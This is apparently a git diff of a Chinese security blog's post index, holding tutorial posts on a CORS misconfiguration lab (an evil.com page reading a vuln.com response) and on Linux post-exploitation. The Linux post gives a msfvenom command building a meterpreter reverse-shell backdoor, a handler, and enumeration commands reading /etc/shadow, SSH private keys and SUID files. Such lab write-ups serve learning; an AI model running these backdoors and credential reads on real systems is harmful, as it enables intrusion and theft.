-<h4 id="7-网络"><a href="#7-网络" class="headerlink" title="7 - 网络"></a>7 - 网络</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ifconfig <span class="literal">-a</span>				// 显示当前可用的所有接口</span><br><span class="line"></span><br><span class="line">hostname				// 显示或设置系统的主机名称。</span><br><span class="line"></span><br><span class="line">netstat <span class="literal">-antp</span>				// 显示网络状态</span><br><span class="line"></span><br><span class="line">netstat <span class="literal">-anup</span>				// 显示网络状态</span><br><span class="line"></span><br><span class="line">lsof <span class="literal">-nPi</span>				// 列出打开的文件</span><br><span class="line"></span><br><span class="line">route <span class="literal">-e</span>				//显示/操作IP路由表</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/resolv.conf			//该文件是DNS域名解析的配置文件，它的格式很简单，每行</span><br><span class="line">					  以一个关键字开头，后接配置参数。resolv.conf的关键</span><br><span class="line">					  字主要有四个，分别是：`nameserver :定义DNS服务器的IP地址</span><br><span class="line"><span class="built_in">cat</span> /etc/hosts				// /etc/hosts是一个简单的文本文件,将IP地址与主机名相</span><br><span class="line">					  关联，每个IP地址一行。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/network/interfaces		// /etc/network/interfaces 文件包含网络接口配置信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/sysconfig/network		// /etc/sysconfig/network 文件用于指定有关服务器上所</span><br><span class="line">					  需网络配置的信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/networks			// /etc/networks是一个简单的ASCII文件,描述这些网络已</span><br><span class="line">					  知DARPA网络符号名称</span><br></pre></td></tr></table></figure>
-
-<h4 id="8-文件系统"><a href="#8-文件系统" class="headerlink" title="8 - 文件系统"></a>8 - 文件系统</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/profile		// /etc/profile 包含Linux系统环境和启动程序。 它被所有的用户使</span><br><span class="line">			  	   用于bash，ksh，sh shell。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/bashrc			// /etc/bashrc或者/etc/bash.bashrc是全系统的bash每个交互式</span><br><span class="line">			  	   shell启动文件。是使用系统广泛的功能和别名。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/.bash_profile		// 类似 /etc/profile, 但仅适用于当前用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/.bash_history		//  打印当前用户bash命令的历史记录</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> <span class="literal">-al</span> /var/log/		// 列出所有日志文件</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-1000</span> <span class="literal">-type</span> d <span class="number">2</span>&gt;/dev/null	// 粘滞位 - 只有目录的所有者或文件的所有者可以在这里删</span><br><span class="line">			  		   除或重命名.</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-g</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null	// SGID（chmod <span class="number">2000</span>）-作为组运行，而不是启动它的用户。</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null	// SUID（chmod <span class="number">4000</span>）-作为所有者运行，而不是启动它的用户。</span><br><span class="line"></span><br><span class="line">find / ( <span class="literal">-perm</span> <span class="literal">-o</span> w <span class="literal">-perm</span> <span class="literal">-o</span> x ) <span class="literal">-type</span> d <span class="number">2</span>&gt;/dev/null		// 找出可写可执行的文件夹</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-xdev</span> <span class="literal">-type</span> d ( <span class="literal">-perm</span> <span class="literal">-0002</span> <span class="literal">-a</span> ! <span class="literal">-perm</span> <span class="literal">-1000</span>) <span class="literal">-print</span>	// 找出可写的文件</span><br><span class="line"></span><br><span class="line">find /<span class="built_in">dir</span> <span class="literal">-xdev</span> ( <span class="literal">-nouser</span> <span class="literal">-o</span> <span class="literal">-nogroup</span> ) <span class="literal">-print</span>			// 找出不是所有者的文件</span><br></pre></td></tr></table></figure>
-
-<h4 id="9-计划用户-crontab"><a href="#9-计划用户-crontab" class="headerlink" title="9 - 计划用户 - crontab"></a>9 - 计划用户 - crontab</h4><p>crond是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，当安装完成操作系统后，默认会 安装此服务 工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行 的任务，则自动执行该任务。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">crontab <span class="literal">-l</span> 				//显示当前用户crontab</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">crontab [-<span class="type">u</span> <span class="type">username</span>] [-<span class="type">l</span>|-<span class="type">e</span>|-<span class="type">r</span>]</span><br><span class="line">参数：</span><br><span class="line"></span><br><span class="line"><span class="literal">-u</span>: 只有root才能进行这个任务，也即帮其他用户新建/删除crontab工作调度;</span><br><span class="line"></span><br><span class="line"><span class="literal">-e</span>: 编辑crontab 的工作内容;</span><br><span class="line"></span><br><span class="line"><span class="literal">-l</span>: 查阅crontab的工作内容;</span><br><span class="line"></span><br><span class="line"><span class="literal">-r</span>: 删除所有的crontab的工作内容，若仅要删除一项，请用<span class="literal">-e</span>去编辑。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>    <span class="number">12</span>   *   *   *    root /etc/init.d/smb restart</span><br><span class="line"><span class="comment">#分  时   日   月  周  |《==============命令行=======》|</span></span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>代表意义</th>
-<th>分钟</th>
-<th>小时</th>
-<th>日期</th>
-<th>月份</th>
-<th>周</th>
-<th>命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>范围</td>
-<td>0-59</td>
-<td>0-23</td>
-<td>1-31</td>
-<td>1-12</td>
-<td>0-7</td>
-<td></td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -582,6 +372,460 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
       </categories>
       <tags>
         <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CORS</title>
+    <url>/2021/02/24/CORS/</url>
+    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><hr>
+<h3 id="0x00-浏览器的同源策略"><a href="#0x00-浏览器的同源策略" class="headerlink" title="0x00 浏览器的同源策略"></a>0x00 浏览器的同源策略</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>同源策略 (Same Origin Policy)</strong>,同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读取对方的资源。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但随着Web应用的发展，网站由于自身业务的其需求，需要实现一些跨域功能，能让不用域的页面之间能互相访问各自页面的内容。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;浏览器的同源目的是为了保证用户信息的安全，防止恶意的网站窃取数据。如果王爷之间不满足同源要求，将不能：</p>
+<blockquote>
+<ol>
+<li>共享Cookie,LocalStorage,IndexDB  </li>
+<li>获取DOM  </li>
+<li>AJAX请求不能发送</li>
+</ol>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01-CORS介绍"><a href="#0x01-CORS介绍" class="headerlink" title="0x01 CORS介绍"></a>0x01 CORS介绍</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__CORS，跨域资源共享（Cross-origin resource sharing）__，是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CORS本质上就是使用各种头信息让浏览器与服务器之间进行交流，上面提到的名单就是用下面的http头字段来控制的： </p>
+<p><img src="/2021/02/24/CORS/1.jpg"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中比较重要的相应头为：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:<span class="regexp">//</span>a.com  	<span class="regexp">//</span>服务端接受来自http:<span class="regexp">//</span>a.com的跨域请求    </span><br><span class="line">Access-Control-Allow-Credentials: true  	<span class="regexp">//</span>表示是否允许发送Cookie，true即发送cookie</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0×02-CORS漏洞的攻击流程"><a href="#0×02-CORS漏洞的攻击流程" class="headerlink" title="0×02 CORS漏洞的攻击流程"></a>0×02 CORS漏洞的攻击流程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;假设用户登陆一个含有CORS配置网站<code>vuln.com</code>，同时又访问了攻击者提供的一个链接<code>evil.com</code>。<code>evil.com</code>的网站向<code>vuln.com</code>这个网站发起请求获取敏感数据，浏览器能否接收信息取决于<code>vuln.com</code>的配置。如果<code>vuln.com</code>配置了<code>Access-Control-Allow-Origin</code>头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。</p>
+<h3 id="0×03-CORS漏洞演示"><a href="#0×03-CORS漏洞演示" class="headerlink" title="0×03 CORS漏洞演示"></a>0×03 CORS漏洞演示</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先修改host文件，加上</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> www.vuln.com </span><br><span class="line"><span class="number">127.0.0.1</span> www.evil.com</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样访问<a href="http://www.vuln.com就相当于服务端.服务端新建a.php./">http://www.vuln.com就相当于服务端。服务端新建a.php。</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username: admin; password:123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果访问<code>http://www.vuln.com/a.php</code>，会正常输出<code>username: admin; password:123456</code></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着在hacker端构造steal.html：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- www.evil.com/steal.html  --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello I evil page. <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">loadXMLDoc</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">xhr.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) <span class="comment">//if receive xhr response</span></span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> datas=xhr.responseText;</span></span><br><span class="line">        alert(datas);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="comment">//request vuln page</span></span></span><br><span class="line"><span class="javascript">xhr.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://www.vuln.com/a.php&quot;</span>,<span class="string">&quot;true&quot;</span>) </span></span><br><span class="line">xhr.send();</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后打开<code>http://www.evil.com/steal.html</code>，html代码的意思是通过XMLHttpRequest访问&nbsp;&nbsp;<u>vuln.com/a.php</u>，然后将获取到的内容alert出来。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是根据同源策略，这是不允许的，结果也和我想的一样：</p>
+<p><img src="/2021/02/24/CORS/2.jpg"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来改一下a.php：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Access-Control-Allow-Origin:http://www.evil.com&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username: admin; password:123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再次访问<code>http://www.evil.com/steal.html</code>，发现可以正常alert了，成功实现了跨域资源的请求。</p>
+<p><img src="/2021/02/24/CORS/3.jpg"></p>
+<h3 id="0×04-CORS漏洞防范"><a href="#0×04-CORS漏洞防范" class="headerlink" title="0×04 CORS漏洞防范"></a>0×04 CORS漏洞防范</h3><ul>
+<li>不要盲目反射Origin头</li>
+<li>严格校验Origin头，避免出现权限泄露</li>
+<li>不要配置Access-Control-Allow-Origin: null</li>
+<li>HTTPS网站不要信任HTTP域</li>
+<li>不要信任全部自身子域，减少攻击面</li>
+<li>不要配置Origin:*和Credentials: true</li>
+<li>增加Vary: Origin头</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux主机信息收集</title>
+    <url>/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Linux主机渗透"><a href="#0x00-Linux主机渗透" class="headerlink" title="0x00 Linux主机渗透"></a>0x00 Linux主机渗透</h3><h5 id="MSF生成LUNIX平台可执行文件"><a href="#MSF生成LUNIX平台可执行文件" class="headerlink" title="MSF生成LUNIX平台可执行文件"></a>MSF生成LUNIX平台可执行文件</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8882</span> <span class="operator">-f</span> elf <span class="literal">-o</span> localmsf8882.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.png"></p>
+<p>生成linux后门时需注意位数为32还是64，和架构: 常见架构：</p>
+<blockquote>
+<p>32bit ：i386,i686,x86,arm </p>
+<p>64bit ：x64,x86_64,amd64,arm64,aarch64</p>
+</blockquote>
+<span id="more"></span>
+
+<h5 id="MSF开启handler"><a href="#MSF开启handler" class="headerlink" title="MSF开启handler"></a>MSF开启handler</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">handler <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">8882</span> <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2.png"></p>
+<h5 id="上传后门至靶机-tmp目录：所有用户、用户组都具有可写权限"><a href="#上传后门至靶机-tmp目录：所有用户、用户组都具有可写权限" class="headerlink" title="上传后门至靶机 /tmp目录：所有用户、用户组都具有可写权限"></a>上传后门至靶机 /tmp目录：所有用户、用户组都具有可写权限</h5><h5 id="靶机运行后门，获取meterpreter"><a href="#靶机运行后门，获取meterpreter" class="headerlink" title="靶机运行后门，获取meterpreter"></a>靶机运行后门，获取meterpreter</h5><p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3.png"></p>
+<h5 id="meterpreter获取到shell默认是-bin-sh"><a href="#meterpreter获取到shell默认是-bin-sh" class="headerlink" title="meterpreter获取到shell默认是/bin/sh"></a>meterpreter获取到shell默认是/bin/sh</h5><h5 id="可以使用-python-c-“import-pty-pty-spawn-‘-bin-bash’-”切换至-bin-bash"><a href="#可以使用-python-c-“import-pty-pty-spawn-‘-bin-bash’-”切换至-bin-bash" class="headerlink" title="可以使用 python -c “import pty;pty.spawn(‘/bin/bash’);”切换至/bin/bash"></a>可以使用 python -c “import pty;pty.spawn(‘/bin/bash’);”切换至/bin/bash</h5><p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/4.png"></p>
+<p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/5.png"></p>
+<h3 id="0x01-Linux主机信息收集"><a href="#0x01-Linux主机信息收集" class="headerlink" title="0x01 Linux主机信息收集"></a>0x01 Linux主机信息收集</h3><h4 id="1-系统架构"><a href="#1-系统架构" class="headerlink" title="1 - 系统架构"></a>1 - 系统架构</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">uname <span class="literal">-a</span>		// 打印系统信息</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/issue		///etc/issue是一个文本文件，其中包含在登录提示之前打印的消息或系统标识</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/*<span class="literal">-release</span>	// /etc/lsb<span class="literal">-release</span>, /etc/redhat<span class="literal">-release</span> 查看操作系统发行版本。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/version	// /proc/version指定了Linux内核的版本，用于编译内核的gcc的版本以及内核</span><br><span class="line">			   编译的时间.它还包含内核编译器的用户名。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/version	// /proc/sys/kernel/ 中的文件可以用来调整和监视Linux内核</span><br><span class="line">			 	   操作中的各种活动</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-进程"><a href="#2-进程" class="headerlink" title="2 - 进程"></a>2 - 进程</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ps</span> <span class="literal">-elf</span>				// 列出当前进程快照</span><br><span class="line"></span><br><span class="line"><span class="built_in">ps</span> aux				// 列出当前进程快照</span><br><span class="line"></span><br><span class="line">s <span class="literal">-al</span> /proc/			// /proc是非常特殊的，它也是一个虚拟文件系统。 它有时被称为过程</span><br><span class="line">				信息伪文件系统。它不包含“真实”文件，而是包含运行时系统信息（例</span><br><span class="line">				如系统内存，安装的设备，硬件配置等）</span><br><span class="line">							</span><br><span class="line"><span class="built_in">ls</span> <span class="literal">-al</span> /proc/<span class="number">99</span>			// 查看关于PID <span class="number">99</span>的信息		</span><br><span class="line"></span><br><span class="line">top				//top命令显示您的Linux机器的处理器活动，并显示实时管理的任务。</span><br><span class="line">				它会显示正在使用的处理器和内存以及运行进程等其他信息。按q可以退出	  </span><br></pre></td></tr></table></figure>
+
+<h4 id="3-用户和组"><a href="#3-用户和组" class="headerlink" title="3 - 用户和组"></a>3 - 用户和组</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">id					// 找到用户的UID或GID等信息.</span><br><span class="line"></span><br><span class="line">w					// 显示登录到Linux服务器的人员.</span><br><span class="line"></span><br><span class="line">whoami					// 显示当前用户名</span><br><span class="line"></span><br><span class="line">last lastb				// 显示用户登录记录 显示用户登录失败记录</span><br><span class="line"></span><br><span class="line">lastlog					// 格式化打印上次登录日志 /var/log/lastlog 文件的内容</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd				// 有关用户信息的基于文本的数据库，可以登录系统或其他拥</span><br><span class="line">					   有正在运行的进程的操作系统用户身份。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow				// /etc/shadow用于通过限制除高度特权的用户对散列密码</span><br><span class="line">				 	   数据的访问来提高密码的安全级别。</span><br><span class="line">				 	   通常情况下，该数据保存在超级用户拥有的文件中，并且只</span><br><span class="line">				 	   能由超级用户访问。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers			// /etc/sudoers 文件内容是使用sudo命令必须遵守的规则</span><br><span class="line"></span><br><span class="line">sudo <span class="literal">-V</span>					// 打印sudo版本字符串</span><br><span class="line"></span><br><span class="line">sudo <span class="literal">-l</span>					// 列出目前用户可执行与无法执行的指令</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-SSH服务信息"><a href="#4-SSH服务信息" class="headerlink" title="4 - SSH服务信息"></a>4 - SSH服务信息</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.ssh/authorized_keys		// 使用公钥认证，认证实体具有公钥和私钥。私钥保存在登录</span><br><span class="line">					   的计算机上,公钥存在要登录的所有计算机上 .ssh/authorized_keys 文件中。</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub			// RSA 公钥 会保存为 .ssh/id_rsa.pub.</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa			// RSA 私钥 会保存在你的home目录中 ：.ssh/id_rsa</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_config			// OpenSSH SSH 控制端配置文件</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config		// OpenSSH SSH 服务端配置文件</span><br><span class="line"></span><br><span class="line">密钥登录</span><br><span class="line"></span><br><span class="line">ssh<span class="literal">-keygen</span>					// 生成密钥对，私钥保存在你登录的计算机上公</span><br><span class="line">						  钥存储在要登录的所有计算机上的.ssh/authorized_keys 文件中。</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub &gt;&gt; authorized_keys	// 安装公钥</span><br><span class="line">chmod <span class="number">600</span> ~/.ssh/authorized_keys</span><br><span class="line">chmod <span class="number">600</span> ~/.ssh/id_rsa</span><br><span class="line">chmod <span class="number">700</span> ~/.ssh				// 设置权限		</span><br><span class="line">vim /etc/ssh/sshd_config			// 编辑服务端配置文件</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">PermitRootLogin yes				// [可选]禁用密码登录</span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line">service sshd restart				// 重启ssh服务</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-服务状态"><a href="#5-服务状态" class="headerlink" title="5 - 服务状态"></a>5 - 服务状态</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">service -<span class="literal">-status</span><span class="literal">-all</span>				// 检查所有服务状态</span><br><span class="line">systemctl <span class="literal">-a</span>					// 列出安装在文件系统中的所有单元.</span><br><span class="line">service servicename <span class="built_in">start</span></span><br><span class="line">systemctl <span class="built_in">start</span> servicename			// 启动某个服务</span><br><span class="line">service servicename stop</span><br><span class="line">systemctl stop servicename			// 停止某个服务</span><br><span class="line">service servicename status</span><br><span class="line">systemctl status servicename			// 显示某个服务状态信息</span><br><span class="line"><span class="built_in">cat</span> /etc/services				// /etc/services将端口号映射到指定的服务</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-安全-iptables"><a href="#6-安全-iptables" class="headerlink" title="6 - 安全 - iptables"></a>6 - 安全 - iptables</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">iptables <span class="literal">-L</span>				// 列出所有规则链。</span><br><span class="line">iptables <span class="operator">-F</span>				// 删除选定规则链中的所有规则.</span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> icmp <span class="literal">-m</span> icmp –icmp<span class="literal">-type</span> <span class="number">0</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line">					// 请执行iptables <span class="literal">-p</span> icmp –help 获得更多信息.</span><br><span class="line">					</span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp –sport <span class="number">80</span> <span class="literal">-m</span> state –state RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">            	// 允许来自src端口<span class="number">80</span>的tcp连接</span><br><span class="line">            	// <span class="literal">-A</span> 新增一条规则 , INPUT[入方向],OUTPUT[出方向]</span><br><span class="line">            	// <span class="literal">-p</span> 协议类型</span><br><span class="line">            	// <span class="literal">-sport</span> 源端口 <span class="literal">-dport</span> 目标端口</span><br><span class="line">            	// <span class="literal">-j</span> 处理数据包的动作，ACCEPT 、DROP</span><br><span class="line"></span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp <span class="literal">-dport</span> <span class="number">80</span> <span class="literal">-m</span> state –state NEW,RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许 从/到 dst 端口<span class="number">80</span>的TCP连接.</span><br><span class="line">			</span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> udp <span class="literal">-m</span> udp –sport <span class="number">53</span> <span class="literal">-m</span> state –state RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许来自src端口<span class="number">80</span>的udp连接</span><br><span class="line"></span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> udp <span class="literal">-m</span> udp –dport <span class="number">53</span> <span class="literal">-m</span> state –state NEW,RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许从/到 dst 端口<span class="number">53</span>的udp连接.</span><br><span class="line">                </span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp –sport <span class="number">55552</span> <span class="literal">-s</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-d</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp –dport <span class="number">55552</span> <span class="literal">-s</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-d</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许本地主机连接到 localhost:<span class="number">55552</span></span><br><span class="line">				// <span class="literal">-s</span> 原地址ip <span class="literal">-d</span> 目标地址ip</span><br><span class="line">				// <span class="literal">-i</span> 指定数据包从哪块网卡进入<span class="literal">-o</span>指定数据包从哪块网卡输出</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-网络"><a href="#7-网络" class="headerlink" title="7 - 网络"></a>7 - 网络</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ifconfig <span class="literal">-a</span>				// 显示当前可用的所有接口</span><br><span class="line"></span><br><span class="line">hostname				// 显示或设置系统的主机名称。</span><br><span class="line"></span><br><span class="line">netstat <span class="literal">-antp</span>				// 显示网络状态</span><br><span class="line"></span><br><span class="line">netstat <span class="literal">-anup</span>				// 显示网络状态</span><br><span class="line"></span><br><span class="line">lsof <span class="literal">-nPi</span>				// 列出打开的文件</span><br><span class="line"></span><br><span class="line">route <span class="literal">-e</span>				//显示/操作IP路由表</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/resolv.conf			//该文件是DNS域名解析的配置文件，它的格式很简单，每行</span><br><span class="line">					  以一个关键字开头，后接配置参数。resolv.conf的关键</span><br><span class="line">					  字主要有四个，分别是：`nameserver :定义DNS服务器的IP地址</span><br><span class="line"><span class="built_in">cat</span> /etc/hosts				// /etc/hosts是一个简单的文本文件,将IP地址与主机名相</span><br><span class="line">					  关联，每个IP地址一行。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/network/interfaces		// /etc/network/interfaces 文件包含网络接口配置信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/sysconfig/network		// /etc/sysconfig/network 文件用于指定有关服务器上所</span><br><span class="line">					  需网络配置的信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/networks			// /etc/networks是一个简单的ASCII文件,描述这些网络已</span><br><span class="line">					  知DARPA网络符号名称</span><br></pre></td></tr></table></figure>
+
